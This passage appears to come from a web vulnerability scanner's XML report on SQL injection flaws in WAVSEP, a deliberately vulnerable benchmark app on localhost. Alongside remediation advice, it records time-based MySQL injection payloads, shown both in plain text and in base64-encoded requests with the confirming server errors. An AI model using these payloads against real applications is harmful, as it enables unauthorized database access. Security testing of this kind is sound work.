    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoMjAwRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMiclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjQxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3939222303850870784</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp [password parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>password</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the password parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the password parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSZwYXNzd29yZD10ZXh0dmFsdWUyJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkyMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowOCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTt0ZXh0dmFsdWUyJiMzOTsmIzM5OyYjMzk7IGF0IGxpbmUgMTwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSZwYXNzd29yZD10ZXh0dmFsdWUyJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSZwYXNzd29yZD10ZXh0dmFsdWUyJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2867050215174718464</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZScmcGFzc3dvcmQ9dGV4dHZhbHVlMiBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkxMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Mjo0OCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7dGV4dHZhbHVlMiYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZScnJnBhc3N3b3JkPXRleHR2YWx1ZTIgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXB